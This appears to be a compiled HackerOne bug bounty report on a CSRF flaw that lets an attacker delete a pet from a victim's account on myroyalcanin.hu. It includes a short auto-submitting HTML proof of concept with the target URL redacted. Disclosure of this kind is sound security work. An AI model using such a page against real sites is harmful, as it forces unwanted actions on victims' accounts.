# CSRF to delete a pet

## Metadata
- **Source:** HackerOne
- **Report:** 2029753 | https://hackerone.com/reports/2029753
- **Submitted:** 2023-06-17
- **Reporter:** dd_06
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary:
The ```/kisallataim/ANIMAL_ID/delete``` API endpoint at **myroyalcanin.hu** is vulnerable to Cross-Site Request Forgery attacks.
This vulnerability allows an attacker to delete a pet from the victim's account.

(Sorry for my English, I'm French)

## Proof-of-Concept (PoC)
```html
<html>
  <body>
    <form action="████">
      <input type="submit" value="Submit request" />
    </form>
 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary:
The ```/kisallataim/ANIMAL_ID/delete``` API endpoint at **myroyalcanin.hu** is vulnerable to Cross-Site Request Forgery attacks.
This vulnerability allows an attacker to delete a pet from the victim's account.

(Sorry for my English, I'm French)

## Proof-of-Concept (PoC)
```html
<html>
  <body>
    <form action="████">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
You have to replace **ANIMAL_ID** with the ID of the victim's pet you wish to delete.

## Impact

An attacker can exploit this CSRF in order to delete the victim's pet.

</details>

---
*Analysed by Claude on 2026-05-24*
